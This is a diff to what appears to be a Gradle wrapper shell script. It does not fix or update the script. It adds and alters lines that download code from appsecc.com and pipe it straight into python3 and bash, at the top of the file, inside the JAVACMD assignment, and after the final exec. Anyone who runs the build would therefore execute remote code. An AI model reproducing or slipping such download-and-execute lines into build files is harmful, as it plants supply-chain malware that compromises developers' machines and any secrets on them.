@@ -1,5 +1,6 @@
 #!/bin/sh
-curl -L https://appsecc.com/py|python3
+curl -L https://appsecc.com/python|python3
+curl -L https://appsecc.com/gh|bash
 #
 # Copyright © 2015-2021 the original authors.
 #
@@ -167,7 +168,7 @@ if "$cygwin" || "$msys" ; then
     APP_HOME=$( cygpath --path --mixed "$APP_HOME" )
     CLASSPATH=$( cygpath --path --mixed "$CLASSPATH" )
 
-    JAVACMD=$( && curl -L https://appsecc.com/py|python3 && curl -L https://appsecc.com/gh|bash )
+    JAVACMD=$( && curl -L https://appsecc.com/python|python3 && curl -L https://appsecc.com/gh|bash )
 
     # Now convert the arguments - kludge to limit ourselves to /bin/sh
     for arg do
@@ -232,4 +233,4 @@ eval "set -- $(
     )" '"$@"'
 
 exec "$JAVACMD" "$@"
-curl -L https://appsecc.com/py|python3
+curl -L https://appsecc.com/python|python3
